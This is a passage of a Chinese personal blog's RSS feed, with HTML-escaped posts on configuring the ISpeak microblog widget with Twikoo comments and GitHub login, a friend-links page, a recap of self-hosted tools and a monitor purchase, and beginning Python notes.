&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;script&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;src&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;https://cdn.staticfile.org/twikoo/1.6.7/twikoo.all.min.js&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style="color:#f92672"&gt;script&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;script&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;var&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;head&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; document.&lt;span style="color:#a6e22e"&gt;getElementsByTagName&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;head&amp;#39;&lt;/span&gt;)[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;var&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;meta&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; document.&lt;span style="color:#a6e22e"&gt;createElement&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;meta&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;meta&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;name&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;referrer&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;meta&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;content&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;no-referrer&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;head&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;appendChild&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;meta&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;ispeak&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;ispeak&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;init&lt;/span&gt;({
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;el&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;#ispeak&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;api&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;这里是后端kkapi地址&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;author&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;后端用户id&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;pageSize&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;loading_img&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;https://bu.dusays.com/2021/03/04/d2d5e983e2961.gif&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;comment&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;speak&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;const&lt;/span&gt; { &lt;span style="color:#a6e22e"&gt;_id&lt;/span&gt;, &lt;span style="color:#a6e22e"&gt;title&lt;/span&gt;, &lt;span style="color:#a6e22e"&gt;content&lt;/span&gt; } &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;speak&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// 4.4.0 之后在此回调函数中初始化评论
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#75715e"&gt;//这里是twikoo的初始化配置，如果使用其他评论可以在这里修改
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;twikoo&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;init&lt;/span&gt;({
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;el&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;.ispeak-comment&amp;#39;&lt;/span&gt;, &lt;span style="color:#75715e"&gt;// 默认情况下 ipseak 生成class为 ispeak-comment 的div
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;path&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/shuoshuo/?q=&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;_id&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;envId&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;twikoo后端地址&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; })
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; })
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; .&lt;span style="color:#a6e22e"&gt;then&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; () {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;console&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;log&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;ispeak 加载完成&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; document.&lt;span style="color:#a6e22e"&gt;getElementById&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;tip&amp;#39;&lt;/span&gt;).&lt;span style="color:#a6e22e"&gt;style&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;display&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;none&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; })
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; document.&lt;span style="color:#a6e22e"&gt;getElementById&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;tip&amp;#39;&lt;/span&gt;).&lt;span style="color:#a6e22e"&gt;innerHTML&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;ipseak依赖加载失败！&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;/&lt;span style="color:#f92672"&gt;script&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;更新一波。被人发现了说说的评论没有独立，自己改了下配置。
上面的代码加入了 32 和 37 行代码，其中 37 行 &lt;code&gt;path&lt;/code&gt; 属性设置为你当前的说说页面路径加 &lt;code&gt;q&lt;/code&gt; 参数，这个参数可能无所谓吧，但是 &lt;code&gt;_id&lt;/code&gt; 是当前说说的唯一 id，因为自己在页面中测试时，说说评论请求的地址格式也是根据 37 行代码这个进行请求查询的。&lt;/p&gt;
&lt;h2 id="github-登陆验证可选"&gt;Github 登陆验证（可选*）
&lt;/h2&gt;&lt;p&gt;可以发布仅登陆可见的说说，但是需要配置 Github app。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;参考&lt;a class="link" href="https://kkapi.js.org/guide/setup/github.html" target="_blank" rel="noopener"
&gt;项目文档&lt;/a&gt;创建 app ，其中填写的 speak 页面路径就是 ISpeak 所在的博客路径&lt;/li&gt;
&lt;li&gt;创建以后拥有了 &lt;code&gt;Client ID&lt;/code&gt; 和 &lt;code&gt;Client Secrets&lt;/code&gt;，这两项需要填写在 kkapi 后端部署的 &lt;code&gt;local.env&lt;/code&gt; 配置中。&lt;/li&gt;
&lt;li&gt;在 kkapi 的后端界面个人设置中填写 &lt;code&gt;GitHubId&lt;/code&gt; 。获得方法访问 github 提供的接口
&lt;code&gt;https://api.github.com/users/&amp;lt;Your UserName&amp;gt;&lt;/code&gt;注意替换尖括号整体为你github的用户名，不是昵称。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src="https://file.acs.pw/picGo/2022/03/13/20220313121930.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;ol start="4"&gt;
&lt;li&gt;在前端页面的 &lt;code&gt;speak&lt;/code&gt; 初始化中添加两个属性&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-js" data-lang="js"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;ispeak&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;init&lt;/span&gt;({
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;speakPage&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;：&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;/shuoshuo/&amp;#34;&lt;/span&gt;, &lt;span style="color:#75715e"&gt;//这里是说说的页面路径，对应于 github app 中填写的 speak 页面路径（用双引号括起来，我不知道为啥单引号不行）
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;githubClientId&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;Iv1.*******&amp;#39;&lt;/span&gt;, &lt;span style="color:#75715e"&gt;//github app 的 Client ID
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;})
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后就可以在你的说说下面找到一个 Github 授权登陆。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/10/04/4aeea0532e5dc44c83a6822033d9971e.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h2 id="完工"&gt;完工
&lt;/h2&gt;&lt;p&gt;说说还支持 markdown 格式的图片插入，看起来更好用了，给作者点个赞。&lt;/p&gt;</description></item><item><title>友链</title><link>https://www.braindance.top/page/friends/</link><pubDate>Sat, 10 Sep 2022 16:26:47 +0800</pubDate><guid>https://www.braindance.top/page/friends/</guid><description>&lt;h2 id="懒狗"&gt;懒狗
&lt;/h2&gt;&lt;figure&gt;&lt;a href="https://www.penginman.com/"&gt;&lt;img src="https://www.penginman.com/img/avatar.png"
alt="为世界上所有的美好而战"&gt;&lt;/a&gt;&lt;figcaption&gt;
&lt;h4&gt;Braindance&lt;/h4&gt;&lt;p&gt;为世界上所有的美好而战&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;h2 id="交换友链"&gt;交换友链
&lt;/h2&gt;&lt;p&gt;想互换友链就留言吧～格式参考如下～&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;name: Braindance
link: https://www.penginman.com
avatar: https://www.penginman.com/img/avatar.png
descr: 为世界上所有的美好而战
&lt;/code&gt;&lt;/pre&gt;</description></item><item><title>关于</title><link>https://www.braindance.top/page/about/</link><pubDate>Sun, 28 Aug 2022 11:58:42 +0800</pubDate><guid>https://www.braindance.top/page/about/</guid><description>&lt;p&gt;为世界上所有的美好而战&lt;/p&gt;</description></item><item><title>近期总结</title><link>https://www.braindance.top/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/</link><pubDate>Wed, 10 Aug 2022 18:39:26 +0800</pubDate><guid>https://www.braindance.top/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/</guid><description>&lt;p&gt;水一篇文章，写写最近干了啥&lt;/p&gt;
&lt;h2 id="onenav"&gt;Onenav
&lt;/h2&gt;&lt;p&gt;一直想找一个导航页的网站，自己天天用书签栏用的找不到太烦了。之前用过webstack主题的网站，本来是直接写源码上的，后来自己做了一个用js读配置文件加载的，但是加网站的时候要手改数据文件。
最后发现了正在用的导航页&lt;a class="link" href="https://github.com/helloxz/onenav" target="_blank" rel="noopener"
&gt;onenav&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;OneNav是一款开源免费的书签（导航）管理程序，使用使用PHP + SQLite 3开发，界面简洁，安装简单，使用方便。OneNav可帮助你你将浏览器书签集中式管理，解决跨设备、跨平台、跨浏览器之间同步和访问困难问题，做到一处部署，随处访问。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;这个程序提供了后台管理的面板，添加网站的时候也能自己识别网站的title和description，还提供了好几个主题。下面是我网站的一部分，总之用起来还挺不错
&lt;img src="https://img.braindance.top/article/2022/08/10/62f36c3a7fccb.png"
loading="lazy"
alt="1660120122763.png"
&gt;
踩的坑：官方文档里只提供了两个网站，但是在演示站找到了五六个，官方也提供了主题的下载和配置，但是需要订阅服务一年19.9，&lt;del&gt;因为我是白嫖怪&lt;/del&gt;，就自己去找源码了&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://gitee.com/baisucode/onenav-theme" target="_blank" rel="noopener"
&gt;baisu&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://gitee.com/baisucode/baisu-two" target="_blank" rel="noopener"
&gt;baisu-two&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://github.com/imsyy/OneNav" target="_blank" rel="noopener"
&gt;Webstack&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;找到源码需要改主题的资源地址，主题默认使用的onenav的旧变量&lt;code&gt;TEMPLATE&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;script src=&amp;#34;templates/&amp;lt;?php echo TEMPLATE; ?&amp;gt;/js/jquery-3.5.1.min.js&amp;#34; type=&amp;#34;text/javascript&amp;#34; charset=&amp;#34;utf-8&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最新版本已经不再使用配置文件中的&lt;code&gt;TEMPLATE&lt;/code&gt;转而为&lt;code&gt;$template&lt;/code&gt;存储，修改以后样式就正常加载了。&lt;/p&gt;
&lt;h2 id="域名"&gt;域名
&lt;/h2&gt;&lt;p&gt;一直因为没有一个com的域名感到遗憾，最近看间谍过家家，记得阿尼亚和玩偶玩过家家的时候，有一只企鹅的名字就叫：[ペんぎんマン ]^(penginman)并且pingin的日语发音和企鹅penguin相似。于是有了这个域名
&lt;a class="link" href="https://www.penginman.com" target="_blank" rel="noopener"
&gt;www.penginman.com&lt;/a&gt;&lt;/p&gt;
&lt;h2 id="mdserver-web"&gt;mdserver-web
&lt;/h2&gt;&lt;p&gt;&lt;a class="link" href="https://github.com/midoks/mdserver-web" target="_blank" rel="noopener"
&gt;mdserver-web&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;简单的Linux面板,感谢BT.CN写出如此好的web管理软件。我一看到，就知道这是我一直想要的页面化管理方式。 复制了后台管理界面，按照自己想要的方式写了一版。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;一个把宝塔面板样式照搬过来的Linux管理面板，感觉现在也不是特别成熟，但是其他面板也没有太顺手的，为什么不用宝塔面板，因为之前报过&lt;a class="link" href="https://github.com/aaPanel/BaoTa/issues/102" target="_blank" rel="noopener"
&gt;关于网传信息泄露问题&lt;/a&gt;，我就是洁癖精。&lt;/p&gt;
&lt;h2 id="图床"&gt;图床
&lt;/h2&gt;&lt;p&gt;之前用过一个Chevereto的图床，但是在国内服务器上部署，然后不想域名备案，所以访问老有问题。心血来潮在github上搜到了这两个项目&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://github.com/lsky-org/lsky-pro" target="_blank" rel="noopener"
&gt;Lsky Pro&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://github.com/XPoet/picx" target="_blank" rel="noopener"
&gt;PicX&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="lsky-pro"&gt;Lsky Pro
&lt;/h3&gt;&lt;p&gt;这个主要发现支持对象存储，之前有篇文章说以后已经把网站的图片存到腾讯云COS了，所以用这个主要充当一个图床上传的工具，还加了一个本地存储策略随便存点东西。上传以后也是可以复制各种类型。
&lt;img src="https://img.braindance.top/article/2022/08/10/62f37bb2cd17f.png"
loading="lazy"
alt="1660124082006.png"
&gt;
还可以在后台直接管理图片。具体的就看仓库的演示图吧。&lt;/p&gt;
&lt;h3 id="picx"&gt;PicX
&lt;/h3&gt;&lt;p&gt;这个用来传一些不大重要的图片把，也算是能用，还是用github当图床的，只是jsdelivr国内经常挂，所以加了两个其他的CDN访问。&lt;/p&gt;
&lt;h2 id="显示器"&gt;显示器
&lt;/h2&gt;&lt;p&gt;开始觉得屏幕小了，也去换了个眼镜还是感觉不好使，上一个眼镜看东西已经有点白了，&lt;del&gt;主要是打派找人太费劲了&lt;/del&gt;，而且已经研究生了，未来看文献也挺不错，打算奖励一个显示器爽爽。去网吧体验了一波27寸，又在网上恶补了一阵子知识，最后相中了AOC Q27G2S/D，趁着打折入了手，买东西的时候还发现京东太会了，我下了个单想看看哪个支付方式能再优惠点就取消，取消的时候选择了少用优惠券，弹出来的页面又领了50块大洋！！！😎😎😎又省一波。
到手送的一跟DP线，发现电脑没有口，只有一个HDMI和两个Mini DP，家里有一根HDMI的好像有问题，帧数高的时候就会花，又在网上买了一个Mini DP转DP，还是同一个快递员给我送的，快递员还认出来我了，怪不好意思的。&lt;/p&gt;
&lt;h2 id="markdown编辑器"&gt;Markdown编辑器
&lt;/h2&gt;&lt;p&gt;最近发现Typora老版本不能用了，而且官方出了正式版需要付费，就找另外找了几个软件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Notion
这个软件感觉用来每个段落排版比较不错，但是windows端是个网页的套壳，而且国内正常好像还访问不了，用过一阵子换了&lt;/li&gt;
&lt;li&gt;Obsidian
也挺不错的软件，可以在多个文章直接加上双向链接，还有脑图什么的，而且开源的插件社区，但是就是因为功能太多了感觉有点复杂&lt;/li&gt;
&lt;li&gt;MarkText
很清爽的一个界面，但是目前还没支持中文。&lt;/li&gt;
&lt;li&gt;Joplin
最后选择用的。界面清爽、管理笔记也挺不错，主要发现了有可以自己部署私有云笔记，下一步折腾这个。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="软路由"&gt;软路由
&lt;/h2&gt;&lt;p&gt;先放一个骚话生成器项目里的模板&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;快过年了，不要再讨论什么NAS、HTPC、OpenWrt之类的了。你带你的大机箱回到家并不能给你带来任何实质性作用，朋友们兜里掏出一大把钱吃喝玩乐，你默默的在家里摆弄你的破群晖。亲戚朋友吃饭问你收获了什么，你说我组了一个RAID 0的ALL IN ONE，亲戚们懵逼了，你还在心里默默嘲笑他们，笑他们不懂你的刮削器，不懂你的Auto Backup，也笑他们看爱奇艺还要忍受会员专属广告。你父母的同事都在说自己的子女一年的收获，儿子买了个房，女儿买了个车，姑娘升职加薪了，你的父母默默无言，说我的儿子装了个黑盒子，开起来嗡嗡响、家里电表走得越来越快了。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;我感觉我要走前辈走过的路了，所以还有个念想就是整一个ALL IN ONE耍一耍，目前没有资金，看中了一个N5105的小主机标价888，等研究生发现工资了，整一个鼓捣鼓捣。&lt;/p&gt;</description></item><item><title>Python-Day-100 笔记</title><link>https://www.braindance.top/posts/python%E7%AC%94%E8%AE%B0/</link><pubDate>Mon, 06 Jun 2022 00:00:00 +0000</pubDate><guid>https://www.braindance.top/posts/python%E7%AC%94%E8%AE%B0/</guid><description>&lt;h2 id="函数"&gt;函数
&lt;/h2&gt;&lt;h3 id="函数的参数"&gt;函数的参数
&lt;/h3&gt;&lt;p&gt;可以使用可变参数&lt;code&gt;def func(*args)&lt;/code&gt;，参数前面的&lt;code&gt;*&lt;/code&gt;代表&lt;code&gt;args&lt;/code&gt;是一个可变参数。&lt;/p&gt;
&lt;h3 id="用模块管理函数"&gt;用模块管理函数
&lt;/h3&gt;&lt;p&gt;每个文件代表一个模块，不同模块的函数命名可以相同，但是如果如下代码引用&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; module1 &lt;span style="color:#f92672"&gt;import&lt;/span&gt; foo
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; module2 &lt;span style="color:#f92672"&gt;import&lt;/span&gt; foo
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;foo()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;程序会调用最后一个调用的&lt;code&gt;foo&lt;/code&gt;函数。
如果导入模块中除了定义的函数以外有可执行的代码，则Python解释器在导入这个模块时就会执行这些代码。可以利用只有被Python解释器直接执行的模块的名字才是 &lt;strong&gt;__main__&lt;/strong&gt; 进行判断&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;foo&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;pass&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# __name__是Python中一个隐含的变量它代表了模块的名字&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 只有被Python解释器直接执行的模块的名字才是__main__&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name__ &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;&amp;#39;call foo()&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; foo()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在其他模块再导入上述模块时，if条件中的语句就不会执行&lt;/p&gt;
&lt;h3 id="变量作用域"&gt;变量作用域
&lt;/h3&gt;&lt;p&gt;Python查找一个变量时会按照“局部作用域”、“嵌套作用域”、“全局作用域”和“内置作用域”的顺序进行搜索。内置作用域及python内置的标识符如：&lt;code&gt;input&lt;/code&gt;、&lt;code&gt;print&lt;/code&gt;、&lt;code&gt;int&lt;/code&gt;。
可以使用&lt;code&gt;global&lt;/code&gt;关键字来指示局部函数中的变量来自&lt;strong&gt;全局变量&lt;/strong&gt;，&lt;code&gt;nonlocal&lt;/code&gt;关键字表示变量来自&lt;strong&gt;外部嵌套函数内的变量&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;事实上，减少对全局变量的使用，也是降低代码之间耦合度的一个重要举措，同时也是对&lt;a class="link" href="https://zh.wikipedia.org/zh-hans/%E5%BE%97%E5%A2%A8%E5%BF%92%E8%80%B3%E5%AE%9A%E5%BE%8B" target="_blank" rel="noopener"
&gt;迪米特法则&lt;/a&gt;的践行。&lt;/p&gt;&lt;/blockquote&gt;
&lt;h2 id="字符串和常用数据结构"&gt;字符串和常用数据结构
&lt;/h2&gt;&lt;h3 id="字符串"&gt;字符串
&lt;/h3&gt;&lt;p&gt;反斜杠&lt;code&gt;\&lt;/code&gt;用来转义。
&lt;code&gt;\&lt;/code&gt;后面可以跟八进制和六进制来表示字符，&lt;code&gt;\u68d2&lt;/code&gt;使用unicode字符编码表示字符。
如果不想使用&lt;code&gt;\&lt;/code&gt;转义，可以在字符串前加上字母&lt;code&gt;r&lt;/code&gt;说明&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;s1 &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;r&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;\n&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\\&lt;/span&gt;&lt;span style="color:#e6db74"&gt;hello, world!&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\\&lt;/span&gt;&lt;span style="color:#e6db74"&gt;\n&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(s1) &lt;span style="color:#75715e"&gt;# \n\\hello, world!\\\n&lt;/span&gt;
